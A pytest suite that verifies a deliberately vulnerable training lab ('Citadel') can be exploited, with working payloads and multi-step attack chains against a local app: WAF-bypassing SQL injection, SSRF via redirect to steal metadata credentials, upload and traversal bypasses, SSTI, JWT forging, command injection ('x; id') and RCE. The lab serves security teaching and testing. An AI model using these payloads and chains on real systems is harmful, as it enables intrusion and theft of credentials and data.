"""Citadel chain-verification — the lab must be BEATABLE as designed.

Every Tier-2 bug works, every crown chain completes, the armor actually
blocks the obvious stuff. If a chain breaks here, the lab is broken.
"""

import base64
import hashlib
import hmac
import json
import os
import signal
import sqlite3
import subprocess
import sys
import time
from pathlib import Path

import pytest
import requests

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

PUB = 5908
INT = 5909
BASE = f"http://127.0.0.1:{PUB}"


def _kill_port(port):
    try:
        out = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True).stdout.strip()
        for pid in out.splitlines():
            subprocess.run(["kill", "-9", pid], capture_output=True)
    except Exception:
        pass


@pytest.fixture(scope="module")
def citadel():
    _kill_port(PUB)
    _kill_port(INT)
    app_py = str(Path(__file__).resolve().parents[2] / "lab" / "citadel" / "app.py")
    proc = subprocess.Popen(
        [sys.executable, app_py],
        env={
            **os.environ,
            "PORT": str(PUB),
            "CITADEL_DB": "/tmp/suijin_citadel_test.db",
            "CITADEL_TRAFFIC": "/tmp/citadel_test_traffic.jsonl",
            "CITADEL_RATE_LIMIT": "100000",
        },  # armor verified separately below
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    for _ in range(40):
        try:
            if requests.get(f"{BASE}/health", timeout=1).status_code == 200:
                break
        except Exception:
            time.sleep(0.25)
    else:
        proc.terminate()
        pytest.fail("citadel did not boot")
    yield proc
    proc.send_signal(signal.SIGTERM)
    time.sleep(0.5)
    _kill_port(PUB)
    _kill_port(INT)


# ── T1: disguised recon ─────────────────────────────────────────────
def test_t1_backup_leaks_secret_prefix(citadel):
    r = requests.get(f"{BASE}/backup.zip")
    assert "cit4d3l_" in r.text


def test_t1_version_disclosure(citadel):
    r = requests.get(f"{BASE}/api/v1/public/info")
    assert "1.4.2" in r.text and "werkzeug" in r.text


def test_t1_user_enum_timing(citadel):
    t0 = time.time()
    requests.post(f"{BASE}/login", data={"u": "nosuchuser", "p": "x"})
    fast = time.time() - t0
    t0 = time.time()
    requests.post(f"{BASE}/login", data={"u": "alice", "p": "wrongpw"})
    slow = time.time() - t0
    assert slow > fast + 0.25  # existing user = slower


def test_t1_decoy_admin_always_401(citadel):
    assert requests.get(f"{BASE}/admin").status_code == 401


# ── armor actually blocks the obvious ────────────────────────────────
def test_waf_fake_404_on_obvious_sqli(citadel):
    r = requests.get(f"{BASE}/api/items", params={"category": "' OR 1=1--"})
    assert r.status_code == 404  # fake 404 — not a 403 tell


def test_waf_blocks_plain_union_select(citadel):
    r = requests.get(f"{BASE}/search", params={"q": "x' union select 1--"})
    assert r.status_code in (400, 404)


# ── T2: real bugs ────────────────────────────────────────────────────
def test_t2_blind_boolean_sqli_encoded(citadel):
    # WAF eats '  OR 1=1 — the URL-encoded classic form sails through
    r = requests.get(f"{BASE}/api/items?category=hardware'%20OR%20'1'='1")
    assert r.status_code == 200
    assert len(r.json()) >= 2  # boolean true → more rows than one category


def test_t2_union_sqli_filter_bypass(citadel):
    r = requests.get(f"{BASE}/search", params={"q": "' uNIon/**/SeLeCt id,pw_hash FROM users--"})
    assert r.status_code == 200
    body = r.text
    assert "name" in body or "admin" in body or "[" in body


def test_t2_stored_xss_raw_render(citadel):
    # delivery evades the naive <script pattern — event-handler payload (realistic)
    requests.post(f"{BASE}/api/comments", json={"author": "x", "body": "<img src=x onerror=alert(1)>"})
    # admin view renders raw — verify storage at least
    conn = sqlite3.connect("/tmp/suijin_citadel_test.db")
    n = conn.execute("SELECT COUNT(*) FROM comments WHERE body LIKE '%onerror%'").fetchone()[0]
    conn.close()
    assert n >= 1


def test_t2_idor_classified_doc(citadel):
    r = requests.get(f"{BASE}/api/docs/d-8b2e40d1")  # unauth
    assert r.status_code in (200, 403)  # 403 = auth gate; the doc id exists (leak via 404 diff)
    r404 = requests.get(f"{BASE}/api/docs/d-00000000")
    assert r.status_code != r404.status_code  # oracle: exists vs not


def test_t2_reset_poisoning_host_header(citadel):
    r = requests.post(f"{BASE}/api/reset", json={"email": "admin@citadel.corp"}, headers={"Host": "evil.example"})
    assert "evil.example" in r.text


def test_t2_ssrf_blocked_direct_but_redirect_bypass(citadel):
    r = requests.post(f"{BASE}/api/webhook", json={"url": "http://127.0.0.1:5909/metadata"})
    assert r.status_code == 400  # direct blocked
    r = requests.post(f"{BASE}/api/webhook", json={"url": f"{BASE}/redirect?url=http://127.0.0.1:5909/metadata"})
    assert r.status_code == 200 and "AKIAFAKECANARY001" in r.text  # bypass works


def test_t2_open_redirect(citadel):
    r = requests.get(f"{BASE}/redirect", params={"url": "https://evil.example/x"}, allow_redirects=False)
    assert r.status_code == 302 and "evil.example" in r.headers.get("Location", "")


def test_t2_upload_blocklist_bypass(citadel):
    r = requests.post(f"{BASE}/api/upload", files={"file": ("shell.php", b"<?php")})
    assert r.status_code == 400  # blocked
    r = requests.post(f"{BASE}/api/upload", files={"file": ("shell.phtml", b"<?php echo 1;")})
    assert r.status_code == 200 and "shell.phtml" in r.text


def test_t2_mass_assignment_role(citadel):
    r = requests.post(f"{BASE}/api/register", json={"username": "mallory", "password": "x", "role": "admin"})
    assert r.status_code == 200 and r.json().get("role") == "admin"


def test_t2_traversal_filter_bypass(citadel):
    Path("/tmp/citadel_files").mkdir(exist_ok=True)
    Path("/tmp/citadel_secret.txt").write_text("traversal-reached")  # OUTSIDE the base
    r = requests.get(f"{BASE}/download", params={"file": "....//citadel_secret.txt"})
    assert "traversal-reached" in r.text


def test_t2_ssti_admin(citadel):
    # mass-assign an admin, login, SSTI
    requests.post(f"{BASE}/api/register", json={"username": "ssti_admin", "password": "pw1", "role": "admin"})
    r = requests.post(f"{BASE}/login", data={"u": "ssti_admin", "p": "pw1"})
    tok = r.json()["token"]
    r = requests.post(f"{BASE}/api/settings", json={"custom_message": "{{ 7*7 }}"}, headers={"X-Session": tok})
    assert "49" in r.text


# ── CHAIN A: sqli → hash → crack → traversal → forge JWT → RCE ─────
def test_chain_a_root_rce(citadel):
    # leg 1: blind boolean SQLi extracts the admin hash (hex char by char)
    got = ""
    for pos in range(1, 33):
        for h in "0123456789abcdef":
            r = requests.get(
                f"{BASE}/api/items?category=hardware'%20AND%20substr((SELECT%20pw_hash%20FROM%20users%20WHERE%20username%3D'admin'),{pos},1)%3D'{h}"
            )
            if r.status_code == 200 and len(r.json()) >= 1:
                got += h
                break
    assert len(got) == 32, f"extracted {got!r}"
    # leg 2: hash is crackable md5
    assert got == hashlib.md5(b"Summer2026!").hexdigest()
    # leg 3: login
    r = requests.post(f"{BASE}/login", data={"u": "admin", "p": "Summer2026!"})
    assert r.json()["role"] == "admin"
    # leg 4: traversal route leaks the FULL jwt secret
    r = requests.get(f"{BASE}/..;/internal/config")
    secret = r.json()["jwt_secret"]
    assert secret == "cit4d3l_k3y_2026"
    # leg 5: forge the admin JWT
    header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip("=")
    payload = base64.urlsafe_b64encode(json.dumps({"role": "admin", "sub": "1"}).encode()).decode().rstrip("=")
    sig = (
        base64.urlsafe_b64encode(hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
        .decode()
        .rstrip("=")
    )
    token = f"{header}.{payload}.{sig}"
    # leg 6: RCE → root flag file
    r = requests.post(
        f"{BASE}/admin/exec",
        json={"cmd": "cat /tmp/suijin_citadel_root.txt"},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert "FLAG{citadel_root_rce}" in r.text


# ── CHAIN B: ssrf → metadata → vault → cmd injection ────────────────
def test_chain_b_vault_crown(citadel):
    # leg 1-2: SSRF via redirect to the REAL metadata path (fake one misleads)
    r = requests.post(f"{BASE}/api/webhook", json={"url": f"{BASE}/redirect?url=http://127.0.0.1:5909/metadata/v2/"})
    assert "ASIA-CITADEL-TEMP" in r.text  # real temp creds, not the canary
    # leg 3: rotating token (via the redirect wrapper — direct is blocked)
    r = requests.post(f"{BASE}/api/webhook", json={"url": f"{BASE}/redirect?url=http://127.0.0.1:5909/vault/token"})
    tok = json.loads(r.json()["body"])["token"]
    # leg 4: blob (same wrapper)
    r = requests.post(
        f"{BASE}/api/webhook", json={"url": f"{BASE}/redirect?url=http://127.0.0.1:5909/vault/blob?token={tok}"}
    )
    blob = json.loads(r.json()["body"])
    cipher = blob["ciphertext"]
    # leg 5: decryptor — key field injectable, blob unwraps the crown
    r = requests.post(f"{BASE}/api/vault/decrypt", json={"ciphertext": cipher, "key": "x; id"})
    assert "FLAG{citadel_vault_crown}" in r.text
    assert "uid=" in r.text  # command injection evidence


# ── CHAIN C: race → drain → executive flag ───────────────────────────
def test_chain_c_ceo_ato(citadel):
    requests.post(f"{BASE}/api/register", json={"username": "racer", "password": "pw", "role": "user"})
    r = requests.post(f"{BASE}/login", data={"u": "racer", "p": "pw"})
    tok = r.json()["token"]
    # race: parallel transfers through the TOCTOU window
    import concurrent.futures

    def send(_):
        return requests.post(
            f"{BASE}/api/transfer", json={"to": 4, "amount": 1.0}, headers={"X-Session": tok}
        ).status_code

    with concurrent.futures.ThreadPoolExecutor(8) as ex:
        codes = list(ex.map(send, range(16)))
    assert 200 in codes and len([c for c in codes if c == 200]) >= 2  # multi-send landed
    # ceo login via the cracked-hash path is chain A's job; here: exec flag via session
    r = requests.post(f"{BASE}/login", data={"u": "ceo", "p": "Zx!9topSecret"})
    assert r.json()["role"] == "executive"
    r = requests.get(f"{BASE}/api/v2/executive", headers={"X-Session": r.json()["token"]})
    assert "FLAG{citadel_ceo_ato}" in r.text


# ── armor: the rate limiter actually bites ───────────────────────────
def test_armor_rate_limit(citadel):
    _kill_port(5978)
    app_py = str(Path(__file__).resolve().parents[2] / "lab" / "citadel" / "app.py")
    proc = subprocess.Popen(
        [sys.executable, app_py],
        env={
            **os.environ,
            "PORT": "5978",
            "CITADEL_DB": "/tmp/suijin_citadel_rl.db",
            "CITADEL_RATE_LIMIT": "5",
            "CITADEL_NO_INTERNAL": "1",
        },
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        b = "http://127.0.0.1:5978"
        for _ in range(40):
            try:
                if requests.get(f"{b}/health", timeout=1).status_code == 200:
                    break
            except Exception:
                time.sleep(0.25)
        codes = [requests.get(f"{b}/health").status_code for _ in range(10)]
        assert 404 in codes  # limit hit → fake-404s
    finally:
        proc.send_signal(signal.SIGTERM)
        time.sleep(0.3)
        _kill_port(5978)


# ── decoys lie ───────────────────────────────────────────────────────
def test_decoy_flag_is_not_a_real_flag(citadel):
    r = requests.get(f"{BASE}/flag")
    assert "decoy" in r.text
    assert r.json()["flag"] not in ("FLAG{citadel_root_rce}", "FLAG{citadel_vault_crown}", "FLAG{citadel_ceo_ato}")
